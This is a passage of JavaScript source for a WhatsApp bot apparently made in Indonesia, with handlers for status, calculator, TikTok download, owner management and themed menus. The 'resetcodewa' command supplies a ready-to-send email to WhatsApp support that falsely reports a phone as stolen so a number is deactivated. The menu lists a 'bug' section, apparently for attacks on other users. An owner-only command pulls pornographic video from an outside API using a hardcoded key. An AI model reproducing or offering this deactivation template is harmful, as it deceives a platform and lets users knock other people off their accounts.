▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗨𝗦 ]══════⊱
╠➤ 𝐊𝐞𝐜𝐞𝐩𝐚𝐭𝐚𝐧 𝐑𝐞𝐬𝐩𝐨𝐧 ${latensi.toFixed(4)} 
╠➤ 𝐒𝐞𝐜𝐨𝐧𝐝 ${oldd - neww} 𝐌𝐢𝐥𝐢𝐬𝐞𝐜𝐨𝐧𝐝𝐬
╠════[ 𝗥𝗨𝗡𝗧𝗜𝗠𝗘 ]══════⊱
╠➤ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
╚══════════════════⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
anjay(respon)
}
break
//════════════════════════════//
case 'speedtest': {
if (isBan) throw (from)

anjay('╔══════[ 𝐓𝐄𝐒𝐓𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃 ]══════⊱\n╠➤ https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg\n╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱')
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = await exec('python speed.py')
} catch (e) {
o = e
 } finally {
let { stdout, stderr } = o
if (stdout.trim()) anjay(stdout)
if (stderr.trim()) anjay(stderr)
}
}
break
//════════════════════════════//
case 'kalkulator': case 'kal': {
if (isBan) throw (from)

if (args.length < 1) return anjay(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
anjay('Error')
} else {
anjay(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
}
break
//════════════════════════════//
case 'bokep':{
if (!isCreator) return
if (isBan) throw (from)

dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
BossRaehan.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: Raehan })
}
break



case 'welcome': {
if (!isCreator) return
if (isBan) throw (from)
if (!m.isGroup) return (from)
if (!isAdmins && !isCreator) return (from)
if (args[0] === "on") {
if (welcm) return anjay('Sudah Aktif')
wlcm.push(from)
anjay('Kelaz')
var groupe = await BossRaehan.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
BossRaehan.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nWELCOME TELAH ON`, contextInfo: { mentionedJid : mems }}, {quoted: Raehan})
} else if (args[0] === "off") {
if (!welcm) return anjay('Dah Beb')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
anjay('Sukses Mematikan Welcome di group ini')
} else {
const komo = {
image:fs.readFileSync("./DataBoss/video/thumbnail.jpg"),
gifPlayback:false,
jpegThumbnail:Mthumb,
caption: `
╔══════[ 𝐊𝐞𝐥𝐚𝐳 ]══════⊱
╠➤https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!

⚠️ DANGERR ⚠️

 `, 
}
BossRaehan.sendMessage(m.chat, komo)
}
}
break
case 'tiktok': case 'tiktoknowm':
if (isBan) throw (from)
if (!q) return anjay(`Link Nya Beb`)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return anjay(`Contoh ${prefix+command} https://vm.tiktok.com/ZSdQycjUx/?k=1`)
let dede = await cl.downloader.tiktok(`${q}`)
krt = await getBuffer(dede.nowm)
anjay(mess.wait)
BossRaehan.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `╔══════[ ꪶ⸸⁹⁹⁹𝐓𝐢𝐤𝐓𝐨𝐤⁹⁹⁹⸸ꫂ͢ ]══════⊱\n╠➤𝐕𝐢𝐝𝐞𝐨𝐧𝐲𝐚 𝐁𝐞𝐛\n╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢  ]══════⊱` }, { quoted: Raehan })
break
//════════════════════════════//
case 'cowner': {
if (!isCreator) return
if (isBan) throw (from)

if (!args[0]) return anjay(`*Example* : #cowner add 628xxxx`)
if (args[1]) {
orgnye = args[1]
} else if (m.quoted) {
orgnye = m.quoted.sender.split("@")[0]
}
const isCwner = owner.includes(orgnye)
if (args[0] === "add") {
if (isCwner) return anjay('User sudah menjadi owner')
owner.push(orgnye)
anjay(`Succes add friends`)
} else if (args[0] === "del") {
if (!isCwner) return anjay('User bukan owner')
let delcwner = owner.indexOf(orgnye)
owner.splice(delcwner, 1)
anjay(`Succes del friends`)
} else {
anjay("Error")
}
}
break
//════════════════════════════//
case 'getname': {
if (isBan) throw (from)

if (qtod === "true") {
namenye = await BossRaehan.getName(m.quoted.sender)
anjay(namenye)
} else if (qtod === "false") {
BossRaehan.sendMessage(from, {text:"Reply orangnya"}, {quoted: Raehan})
}
}
break
//════════════════════════════//
case 'getpic': {
if (isBan) throw (from)

if (qtod === "true") {
try {
pporg = await BossRaehan.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
BossRaehan.sendMessage(m.chat, { image : { url : pporg }, caption:`Done` }, { quoted : m })
} else if (qtod === "false") {
try {
pporgs = await BossRaehan.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
BossRaehan.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, { quoted : m })
}
}
break
//════════════════════════════//

case 'creator': {
if (isBan) throw (from)

BossRaehan.sendContact(m.chat, global.owner, m)
}
break


//════════════[ BATAS NONTON BOKEP ]════════════════//

case 'medsos': {
if (isBan) throw (from)
anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭


╔══════[ 𝐌𝐄𝐃𝐒𝐎𝐒 ]══════⊱
╠➤ https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg
╠════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱
╠➤ Https://facebook.com/raehan1986
╠════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱
╠➤ https://www.instagram.com/raehan1986/?hl=id
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭
`, 
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break


//════════════════════════════//
case 'resetcodewa': {
if (isBan) throw (from)
anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

𝐁𝐘 𝐑𝐀𝐄𝐇𝐀𝐍 1986

𝐄𝐦𝐚𝐢𝐥

android@whatsapp.com
support@support.whatsapp.com
android_web@support.whatsapp.com
android@support.whatsapp.com

𝐒𝐮𝐛𝐣𝐞𝐤

𝐓𝐞𝐱𝐭𝐍𝐲𝐚

Buenas noches Ocupo que desactiven mi numero por asunto de robo/extraviado [+62xxx] porque tiene datos muy personales míos, por asuntos de trabajo, y porque contiene cuentas con números de cuentas muy secretas Por favor desactiven el número Buenas días/noches, gracias[+62xxx]

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭
`, 
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
//════════════════════════════//
case 'grupbot': {
if (isBan) throw (from)
anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐆𝐑𝐔𝐏 𝐈𝐍𝐅𝐎 ]══════⊱
╠➤1. https://chat.whatsapp.com/IfpKnoWe3dJGaZswAcUOOH
╠➤2. https://chat.whatsapp.com/IReEw8uRufv55ehFUGLT1G
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐆𝐑𝐔𝐏 𝐁𝐄𝐁𝐀𝐒 ]══════⊱
╠➤1. https://chat.whatsapp.com/LGq2BbWITTjIEgFprexNzC
╠➤2. https://chat.whatsapp.com/DqZzzvg2qIf5kiCHNcjgE6
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭

 https://www.instagram.com/raehan1986/?hl=id
 
 ▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯
▬▭▬▭▬▭▬▭▬▬▭▬▭
`, 
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break

//════════════════════════════//
case 'installbot': {
if (isBan) throw (from)
anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐢𝐧𝐬𝐭𝐚𝐥𝐥𝐛𝐨𝐭 ]══════⊱
╠➤ $ pkg update && pkg upgrade
╠➤ $ pkg install nodejs ffmpeg nano mc libwebp imagemagick bash mc git
╠➤ $ git clone https://github.com/SMK-Team/SMKV2.git
╠➤ $ ls
╠➤ $ termux-setup-storage
╠➤ $ cp -r NamaFileBot /sdcard
╠➤ $ termux-setup-storage
╠➤ $ cd /sdcard
╠➤ $ cd nama file bot
╠➤ $ npm start 
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱


▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭
`, 
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break

//════════════════════════════//
case 'menu': {
if (isBan) throw (from)
anu = `
 ▬▭▬▭▬▭▬▭▬▬▭▬▭
 
◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

 ▬▭▬▭▬▭▬▭▬▬▭▬▭
╭━━❍ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢❍━━╮
┃╭━━━━━━━━━━━━━━━━╾•
┃┃   ❍ 𝙈𝙀𝙉𝙐 𝘽𝙐𝙂 ❍
┃╰━━━━━━━━━━━━━━━━╾•
┃ ┃ ╭┈────────────╮
┃ ┃│⃟•╾ 𝐁𝐔𝐆𝐌𝐄𝐍𝐔 ➢
┃ ┃ ╰┈────────────╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ݊⃟̥⃝̇݊⃟╾━━╯
 ▬▭▬▭▬▭▬▭▬▬▭▬▭
╭━━❍ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢❍━━╮
┃ ╭━━━━━━━━━━━━━━━━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │ ❍ 𝑴𝑬𝑵𝑼 𝑨𝑼𝑻𝑶 ❍
┃ ┃ ╰┈────────────╯
┃ ╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╾•
┃│⃟•╾ 𝐀𝐔𝐓𝐎𝐊𝐄𝐓𝐈𝐊 𝐎𝐧 / 𝐎𝐟𝐟
┃│⃟•╾ 𝐀𝐔𝐓𝐎𝐕𝐍 𝐎𝐧 / 𝐎𝐟𝐟
┃│⃟•╾ 𝐀𝐔𝐓𝐎𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐎𝐧 / 𝐎𝐟𝐟
┃│⃟•╾ 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐎𝐧 / 𝐎𝐟𝐟
┃╰━━━━━━━━━━━━━━━╯
┣━━━╼⃟݊⃟̥⃝̇݊݊⃟ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ݊⃟̥⃝̇݊⃟╾━━━•
┃╭━━━━━━━━━━━━━━━━╾•
┃┃   ❍ 𝐌𝐄𝐍𝐔 𝐌𝐎𝐃𝐒 ❍
┃╰━━━━━━━━━━━━━━━━╾•
┃╭━━━━━━━━━━━━━━━━╾•
┃│⃟•╾ 𝐀𝐒𝐔𝐏𝐀𝐍𝐌𝐀𝐓𝐀 ➢
┃│⃟•╾ 𝐒𝐂𝐑𝐀𝐏𝐄𝐑𝐈𝐌𝐀𝐆𝐄 ➢
┃│⃟•╾ 𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐌𝐄𝐍𝐔 ➢
┃│⃟•╾ 𝐍𝐒𝐅𝐖 ➢
┃│⃟•╾ 𝐑𝐀𝐍𝐃𝐎𝐌𝐒𝐎𝐔𝐍𝐃 ➢
┃│⃟•╾ 𝐅𝐔𝐍𝐍𝐌𝐄𝐍𝐔 ➢
┃│⃟•╾ 𝐈𝐒𝐋𝐀𝐌𝐈𝐘𝐀𝐇 ➢
┃│⃟•╾ 𝐕𝐎𝐈𝐂𝐄𝐂𝐇𝐀𝐑𝐆𝐄𝐑 ➢
┃│⃟•╾ 𝐁𝐄𝐑𝐈𝐓𝐀𝐍𝐄𝐖𝐒 ➢
┃│⃟•╾ 𝐂𝐌𝐃𝐌𝐄𝐍𝐔 ➢
┃│⃟•╾ 𝐒𝐄𝐀𝐑𝐂𝐇𝐌𝐄𝐍𝐔 ➢
┃│⃟•╾ 𝐆𝐑𝐎𝐔𝐏𝐌𝐄𝐍𝐔 ➢
┃│⃟•╾ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐌𝐄𝐍𝐔 ➢
┃│⃟•╾ 𝐎𝐖𝐍𝐄𝐑𝐌𝐄𝐍𝐔 ➢
┃│⃟•╾ 𝐌𝐄𝐃𝐒𝐎𝐒 ➢
┃│⃟•╾ 𝐒𝐂 ➢
┃│⃟•╾ 𝐈𝐍𝐒𝐓𝐀𝐋𝐋𝐁𝐎𝐓 [ 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ] ➢
┃│⃟•╾ 𝐆𝐑𝐔𝐏𝐁𝐎𝐓 ➢
┃│⃟•╾ 𝐑𝐄𝐒𝐄𝐓𝐂𝐎𝐃𝐄𝐖𝐀 ➢
┃╰━━━━━━━━━━━━━━━╯
╰━━━╼⃟݊⃟̥⃝̇݊݊⃟ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ݊⃟̥⃝̇݊⃟╾━━━╯
 ▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
 ▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

 ▬▭▬▭▬▭▬▭▬▬▭▬▭
`, 
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break
//════════════════════════════//
case 'cerpen':{
if (isBan) throw (from)
if (!q) return m.reply(`

▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
╔══════[ 𝐜𝐞𝐫𝐩𝐞𝐧 ]══════⊱
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐚𝐧𝐚𝐤
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐛𝐚𝐡𝐚𝐬𝐚 𝐝𝐚𝐞𝐫𝐚𝐡
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐛𝐚𝐡𝐚𝐬𝐚 𝐢𝐧𝐠𝐠𝐫𝐢𝐬𝐊𝐚𝐤
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐛𝐚𝐡𝐚𝐬𝐚 𝐣𝐚𝐰𝐚 
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐛𝐚𝐡𝐚𝐬𝐚 𝐬𝐮𝐧𝐝𝐚
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐛𝐮𝐝𝐚𝐲𝐚
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐜𝐢𝐧𝐭𝐚
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐜𝐢𝐧𝐭𝐚 𝐢𝐬𝐥𝐚𝐦𝐢
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐜𝐢𝐧𝐭𝐚 𝐩𝐞𝐫𝐭𝐚𝐦𝐚
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐜𝐢𝐧𝐭𝐚 𝐫𝐨𝐦𝐚𝐧𝐭𝐢𝐬
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐜𝐢𝐧𝐭𝐚 𝐬𝐞𝐝𝐢𝐡
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐜𝐢𝐧𝐭𝐚 𝐬𝐞𝐠𝐢𝐭𝐢𝐠𝐚
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐜𝐢𝐧𝐭𝐚 𝐬𝐞𝐣𝐚𝐭𝐢
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐠𝐚𝐥𝐚𝐮
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐠𝐨𝐤𝐢𝐥
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐢𝐧𝐬𝐩𝐢𝐫𝐚𝐭𝐢𝐟
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐣𝐞𝐩𝐚𝐧𝐠
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐤𝐞𝐡𝐢𝐝𝐮𝐩𝐚𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐤𝐞𝐥𝐮𝐚𝐫𝐠𝐚
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐤𝐢𝐬𝐚𝐡 𝐧𝐲𝐚𝐭𝐚
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐤𝐩𝐫𝐞𝐚
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐤𝐫𝐢𝐬𝐭𝐞𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐥𝐢𝐛𝐮𝐫𝐚𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐥𝐢𝐧𝐠𝐤𝐮𝐧𝐠𝐚𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐥𝐮𝐜𝐮
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐦𝐚𝐥𝐚𝐲𝐬𝐢𝐚
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐦𝐞𝐧𝐠𝐡𝐚𝐫𝐮𝐤𝐚𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐦𝐢𝐬𝐭𝐞𝐫𝐢
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐦𝐨𝐭𝐢𝐯𝐚𝐬𝐢
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐧𝐚𝐬𝐢𝐡𝐚𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐧𝐚𝐬𝐢𝐨𝐧𝐚𝐥𝐢𝐬𝐦𝐞
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐨𝐥𝐚𝐡𝐫𝐚𝐠𝐚
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐩𝐚𝐭𝐚𝐡 𝐡𝐚𝐭𝐢
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐩𝐞𝐧𝐚𝐧𝐭𝐢𝐚𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐩𝐞𝐧𝐝𝐢𝐝𝐢𝐤𝐚𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐩𝐞𝐧𝐠𝐚𝐥𝐚𝐦𝐚𝐧 𝐩𝐫𝐢𝐛𝐚𝐝𝐢
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐩𝐞𝐧𝐠𝐨𝐫𝐛𝐚𝐧𝐚𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐩𝐞𝐧𝐲𝐞𝐬𝐚𝐥𝐚𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐩𝐞𝐫𝐣𝐮𝐚𝐧𝐠𝐚𝐧
╠➤ 𝐜𝐞𝐫𝐩𝐞𝐧 𝐩𝐞𝐫𝐩𝐢𝐬𝐚𝐡𝐚𝐧
